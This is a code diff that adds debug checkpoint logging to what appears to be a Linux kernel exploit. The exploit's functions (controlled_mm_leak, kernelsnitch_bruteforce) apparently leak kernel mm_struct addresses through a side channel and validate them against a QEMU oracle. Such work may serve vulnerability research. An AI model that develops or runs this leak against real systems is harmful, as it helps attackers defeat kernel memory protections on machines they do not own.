@@ -1050,6 +1050,21 @@ static int qemu_mm_trace_read(uintptr_t *mm_out) {
 }
 #endif
 
+#if defined(APP_CONTROLLED_MM_CALL_CHECKPOINT) && \
+    APP_CONTROLLED_MM_CALL_CHECKPOINT
+static int controlled_mm_checkpoint_active;
+static unsigned long controlled_mm_checkpoint_attempt;
+#define CONTROLLED_MM_INTERNAL_CHECKPOINT(fmt, ...)                         \
+  do {                                                                      \
+    if (controlled_mm_checkpoint_active) {                                  \
+      pr_info("controlled mm internal checkpoint attempt=%lu " fmt "\n", \
+              controlled_mm_checkpoint_attempt, ##__VA_ARGS__);             \
+    }                                                                       \
+  } while (0)
+#else
+#define CONTROLLED_MM_INTERNAL_CHECKPOINT(fmt, ...) do { } while (0)
+#endif
+
 static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
                               uintptr_t *mm_out, int *hint_hit) {
 #ifdef QEMU_MM_TRACE_ORACLE
@@ -1080,6 +1095,9 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
 
   *hint_hit = 0;
   for (size_t pass = 0; pass < passes; ++pass) {
+    CONTROLLED_MM_INTERNAL_CHECKPOINT(
+        "stage=setup-enter pass=%zu hint=%016zx collisions=%zu",
+        pass, current_hint, collisions);
     struct kernelsnitch_shared_state *state = kernelsnitch_setup(
         MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
     pid_t child;
@@ -1087,9 +1105,15 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
     int status;
 
     if (!state) {
+      CONTROLLED_MM_INTERNAL_CHECKPOINT(
+          "stage=setup-return pass=%zu state=null", pass);
       return -1;
     }
+    CONTROLLED_MM_INTERNAL_CHECKPOINT(
+        "stage=setup-return pass=%zu state=%p", pass, (void *)state);
     kernelsnitch_set_profile(state, 256, REPEAT_MEASUREMENT, AVERAGE);
+    CONTROLLED_MM_INTERNAL_CHECKPOINT(
+        "stage=profile-return pass=%zu", pass);
 #ifdef QEMU_MM_TRACE_VALIDATE
     uintptr_t oracle_mm = 0;
     if (!qemu_mm_trace_drain()) {
@@ -1099,10 +1123,19 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
     }
 #endif
     child = clone_controlled_leak_child(state);
+    CONTROLLED_MM_INTERNAL_CHECKPOINT(
+        "stage=clone-return pass=%zu child=%d", pass, child);
     fd = open_memfd(child);
+    CONTROLLED_MM_INTERNAL_CHECKPOINT(
+        "stage=memfd-return pass=%zu child=%d fd=%d", pass, child, fd);
+    CONTROLLED_MM_INTERNAL_CHECKPOINT(
+        "stage=waitpid-enter pass=%zu child=%d", pass, child);
     int child_ok = waitpid(child, &status, 0) == child && WIFEXITED(status) &&
                    !WEXITSTATUS(status) &&
                    kernelsnitch_found_collisions(state);
+    CONTROLLED_MM_INTERNAL_CHECKPOINT(
+        "stage=waitpid-return pass=%zu child=%d status=%d child_ok=%d",
+        pass, child, status, child_ok);
 #ifdef QEMU_MM_TRACE_VALIDATE
     int oracle_ok = qemu_mm_trace_read(&oracle_mm);
     if (!child_ok) {
@@ -1122,7 +1155,12 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
       return -2;
     }
     if (current_hint) {
+      CONTROLLED_MM_INTERNAL_CHECKPOINT(
+          "stage=match-enter pass=%zu hint=%016zx", pass, current_hint);
       state->mm_struct = controlled_mm_match_page(state, current_hint);
+      CONTROLLED_MM_INTERNAL_CHECKPOINT(
+          "stage=match-return pass=%zu mm=%016zx", pass,
+          state->mm_struct);
       if (state->mm_struct == (uintptr_t)-1) {
         close(fd);
         state->state = KERNELSNITCH_MM_NOT_FOUND;
@@ -1135,7 +1173,12 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
       state->state = KERNELSNITCH_MM_FOUND;
       *hint_hit = 1;
     } else {
+      CONTROLLED_MM_INTERNAL_CHECKPOINT(
+          "stage=bruteforce-enter pass=%zu", pass);
       kernelsnitch_bruteforce(state);
+      CONTROLLED_MM_INTERNAL_CHECKPOINT(
+          "stage=bruteforce-return pass=%zu mm=%016zx", pass,
+          state->mm_struct);
     }
     if (state->mm_struct == (uintptr_t)-1) {
       close(fd);
@@ -1157,7 +1200,11 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
       return -2;
     }
 #endif
+    CONTROLLED_MM_INTERNAL_CHECKPOINT(
+        "stage=cleanup-enter pass=%zu mm=%016zx", pass, *mm_out);
     kernelsnitch_cleanup(state);
+    CONTROLLED_MM_INTERNAL_CHECKPOINT(
+        "stage=cleanup-return pass=%zu fd=%d", pass, fd);
     return fd;
   }
   return -2;
@@ -1213,10 +1260,14 @@ static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
               "peak=%zu hint=%016zx\n",
               attempt, peak_count, hint);
     }
+    controlled_mm_checkpoint_active =
+        peak_count >= APP_CONTROLLED_MM_CALL_CHECKPOINT_MIN_COUNT;
+    controlled_mm_checkpoint_attempt = attempt;
 #endif
     fd = controlled_mm_leak(cpu_count, hint, &mm, &hint_hit);
 #if defined(APP_CONTROLLED_MM_CALL_CHECKPOINT) && \
     APP_CONTROLLED_MM_CALL_CHECKPOINT
+    controlled_mm_checkpoint_active = 0;
     if (peak_count >= APP_CONTROLLED_MM_CALL_CHECKPOINT_MIN_COUNT) {
       pr_info("controlled mm leak checkpoint stage=return attempt=%lu "
               "peak=%zu fd=%d mm=%016zx hint_hit=%d\n",
